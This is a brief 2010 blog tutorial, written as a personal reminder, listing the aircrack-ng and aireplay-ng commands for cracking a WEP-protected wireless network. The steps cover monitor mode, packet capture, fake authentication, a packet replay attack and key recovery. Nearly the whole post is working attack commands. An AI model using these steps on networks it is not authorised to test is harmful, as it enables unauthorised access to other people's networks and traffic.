Title: Aircrack Quick Tutorial (Wireless WEP Cracking)
Date: 2010-11-03
Author: Seppe "Macuyiko" vanden Broucke

Speaking of [wireless](|filename|2010_11_ubuntu-1010-fixed-channel-mon0-1.md)...

The following is just a quick note-to-self, because I always forget the exact commands and end up crawling around the [Aircrack wiki](http://www.aircrack-ng.org/doku.php) for a bit. I though I'd posted this before, but I can't seem to find it.

### TTY1

    sudo airmon-ng start eth1
    # Assume monitor started on mon0...

    sudo airodump-ng mon0
    # Scout interesting APs

    sudo airodump-ng --channel X --bssid XX:XX:XX:XX:XX:XX -w output mon0
    # Make sure to replace "X". This terminal is now dumping data

### TTY2

    sudo aireplay-ng -1 0 -a XX:XX:XX:XX:XX:XX mon0
    # ... Association successful :-)

Now start the attack. I like opening a new terminal for this.
Don't bother with the ARP request replay attack. The best method to use is the `-p 0841` one, especially when using a crappy wifi chip like me (3945ABG). Last time I checked, the advanced attack methods (KoreK chopchop, fragmentation, caffe-latte and Hirte) didn't work.

### TTY3

    sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b XX:XX:XX:XX:XX:XX mon0
    # Wait until a packet is captured. It's best to use a small one (Size: 68).

    # Reinject and the data-counter in TTY1 (airodump) should go up.

### TTY4

    sudo aircrack-ng -b XX:XX:XX:XX:XX:XX output*.cap

### TTY5 (optional)

    sudo aircrack-ng -K -b XX:XX:XX:XX:XX:XX output*.cap
